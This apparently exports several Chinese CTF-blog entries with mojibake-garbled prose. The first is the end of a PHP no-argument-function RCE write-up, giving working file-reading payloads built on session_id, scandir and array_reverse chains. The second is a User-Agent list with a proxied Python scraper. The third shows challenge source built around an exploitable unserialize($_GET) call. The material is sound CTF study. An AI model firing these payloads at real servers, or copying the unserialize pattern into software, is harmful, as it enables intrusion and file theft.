<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvjkoj30np050aa8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvjkoj30np050aa8.jpg" class="lazyload" title="test"></a></p>
<p>å¯ä»¥çœ‹åˆ° <code>flag.php</code> æ˜¯å€’æ•°ç¬¬äºŒä¸ªå€¼ï¼Œå‡è®¾æ˜¯å€’æ•°ç¬¬ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥ç”¨end()ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä¸€ä¸ªæ“ä½œæ•°ç»„çš„å‡½æ•°èƒ½å¤Ÿè¾“å‡ºæ•°ç»„çš„å€’æ•°ç¬¬äºŒä¸ªå€¼ã€‚å¦‚ä½•è§£å†³ï¼Œçœ‹äº†å¤§ä½¬çš„æ–‡ç« æ€»ç»“äº›æ–¹æ³•</p>
<h3 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h3><p>ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ludy6j30pi04zq34.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ludy6j30pi04zq34.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åé€šè¿‡æ“ä½œæ•°ç»„çš„æ–¹æ³•ï¼Œ<code>next()</code> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¾“å‡º<br><code>next(array_reverse(scandir(pos(localeconv()))))</code> å°±å¾—åˆ°äº† <code>flag.php</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lulfxj30oy04rglo.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lulfxj30oy04rglo.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a>array_rand(array_flip())</h3><p><code>array_flip()</code> äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;var_dump(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lyzeij30xg04aaaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lyzeij30xg04aaaa.jpg" class="lazyload" title="test"></a></p>
<p><code>array_rand()</code> ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å›ï¼Œæœ¬é¢˜ç›®ä¸­<code>scandir()</code>è¿”å›çš„æ•°ç»„åªæœ‰5ä¸ªå…ƒç´ ï¼Œåˆ·æ–°å‡ æ¬¡å°±èƒ½åˆ·å‡ºæ¥ <code>flag.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;var_dump(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1m1gymj30ql04qwek.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1m1gymj30ql04qwek.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="session-id-session-start"><a href="#session-id-session-start" class="headerlink" title="session_id(session_start())"></a>session_id(session_start())</h3><p>é€šè¿‡é£˜é›¶å¸ˆå‚…çš„æ–‡ç« å¯ä»¥çŸ¥é“ï¼Œé¢˜ç›®è™½ç„¶banäº† <code>hex</code> å…³é”®å­—ï¼Œå¯¼è‡´ <code>hex2bin()</code> è¢«ç¦ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¹¶ä¸ä¾èµ–äºåå…­è¿›åˆ¶è½¬ASCIIçš„æ–¹å¼ï¼Œå› ä¸º <code>flag.php</code> è¿™äº›å­—ç¬¦æ˜¯ <code>PHPSESSID</code> æœ¬èº«å°±æ”¯æŒçš„ã€‚</p>
<p>ä½¿ç”¨ <code>session</code>ä¹‹å‰éœ€è¦é€šè¿‡ <code>session_start()</code> å‘Šè¯‰PHPä½¿ç”¨sessionï¼Œphpé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ã€‚</p>
<p><code>session_id()</code> å¯ä»¥è·å–åˆ°å½“å‰çš„session idã€‚</p>
<p>å› æ­¤æˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®åä¸º <code>PHPSESSID</code> çš„cookieï¼Œå¹¶è®¾ç½®å€¼ä¸º <code>flag.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?exp=readfile(session_id(session_start()));</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=flag.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1miai4j311o0av773.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1miai4j311o0av773.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="å…¶ä½™çš„payload"><a href="#å…¶ä½™çš„payload" class="headerlink" title="å…¶ä½™çš„payload"></a>å…¶ä½™çš„payload</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</span><br><span class="line">pos() current() éƒ½è¡Œ</span><br><span class="line"></span><br><span class="line">?exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></div>


<hr>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">é£˜é›¶å¸ˆå‚…: PHP Parametric Function RCE</a><br><a href="https://www.gem-love.com/websecurity/530.html" target="_blank" rel="noopener">ç®€æGXY_CTF â€œç¦æ­¢å¥—å¨ƒâ€æ— å‚æ•°RCE</a><br><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html" target="_blank" rel="noopener">æ— å‚æ•°å‡½æ•°RCE</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>User-Agent å¤§å…¨</title>
    <url>/yakko117/2020/02/05/User_agent/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>ç™¾åº¦æ•´ç†çš„(copy é›¾)</p>
<a id="more"></a>

<h1 id="PCç«¯"><a href="#PCç«¯" class="headerlink" title="PCç«¯"></a>PCç«¯</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Opera</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60</span><br><span class="line">Opera/8.0 (Windows NT 5.1; U; en)</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50</span><br><span class="line"></span><br><span class="line"><span class="attribute">Firefox</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0</span><br><span class="line">Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10</span><br><span class="line"></span><br><span class="line"><span class="attribute">Safari</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2</span><br><span class="line"></span><br><span class="line"><span class="attribute">chrome</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36</span><br><span class="line">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16</span><br><span class="line"></span><br><span class="line"><span class="attribute">360</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">æ·˜å®æµè§ˆå™¨</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11</span><br><span class="line"></span><br><span class="line">çŒè±¹æµè§ˆå™¨</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span><br><span class="line"></span><br><span class="line"><span class="attribute">QQæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)</span><br><span class="line"></span><br><span class="line"><span class="attribute">sogouæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class="line"></span><br><span class="line"><span class="attribute">maxthonæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="attribute">UCæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="ç§»åŠ¨ç«¯"><a href="#ç§»åŠ¨ç«¯" class="headerlink" title="ç§»åŠ¨ç«¯"></a>ç§»åŠ¨ç«¯</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">IPhone</span></span><br><span class="line">Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">IPod</span></span><br><span class="line">Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">IPAD</span></span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5</span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">Android</span></span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">QQæµè§ˆå™¨ Androidç‰ˆæœ¬</span><br><span class="line">MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">Android Opera Mobile</span><br><span class="line">Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10</span><br><span class="line"></span><br><span class="line">Android Pad Moto Xoom</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"></span><br><span class="line"><span class="attribute">BlackBerry</span></span><br><span class="line">Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+</span><br><span class="line"></span><br><span class="line">WebOS HP Touchpad</span><br><span class="line">Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0</span><br><span class="line"></span><br><span class="line">Nokia N97</span><br><span class="line">Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124</span><br><span class="line"></span><br><span class="line">Windows Phone Mango</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)</span><br><span class="line"></span><br><span class="line"><span class="attribute">UCæµè§ˆå™¨</span></span><br><span class="line"><span class="attribute">UCWEB7.0.2.37/28/999</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">NOKIA5700/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line"><span class="attribute">UCOpenwave</span></span><br><span class="line">Openwave/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line">UC Opera</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="Python3-ä¸­çš„çˆ¬è™«"><a href="#Python3-ä¸­çš„çˆ¬è™«" class="headerlink" title="Python3 ä¸­çš„çˆ¬è™«"></a>Python3 ä¸­çš„çˆ¬è™«</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    url=<span class="string">u"https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711?fr=aladdin"</span></span><br><span class="line">    user_agent=<span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span></span><br><span class="line">    header=&#123;<span class="string">'User-Agent'</span>:user_agent&#125;</span><br><span class="line">    proxies=&#123;<span class="string">"http"</span>:<span class="string">"http://125.120.11.219:6666"</span>&#125;</span><br><span class="line">    response=requests.get(url,headers=header,proxies=proxies)</span><br><span class="line">    <span class="keyword">print</span> (response.text)</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>èµµå¸ˆå‚…çš„æ–°æ˜¥çº¢åŒ…é¢˜</title>
    <url>/yakko117/2020/01/31/2020%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜-1"><a href="#2020-æ–°æ˜¥çº¢åŒ…é¢˜-1" class="headerlink" title="[2020 æ–°æ˜¥çº¢åŒ…é¢˜] 1"></a>[2020 æ–°æ˜¥çº¢åŒ…é¢˜] 1</h1><p><a href="https://buuoj.cn/challenges#[2020%20%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98]1" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a><br>é¢˜ç›®æ”¹ç¼–äº <code>2019å…¨å›½å¤§å­¦ç”Ÿå®‰å…¨è¿ç»´èµ› EZPOP</code></p>
<h2 id="æºç å¦‚ä¸‹"><a href="#æºç å¦‚ä¸‹" class="headerlink" title="æºç å¦‚ä¸‹"></a>æºç å¦‚ä¸‹</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store, $key = <span class="string">'flysystem'</span>, $expire = null)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span> </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span></span><br><span class="line">        $cache_filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . uniqid() . $name;</span><br><span class="line">        <span class="keyword">if</span>(substr($cache_filename, -strlen(<span class="string">'.php'</span>)) === <span class="string">'.php'</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">'?'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $cache_filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>];</span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// åˆ›å»ºå¤±è´¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">"uploads/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure></div>

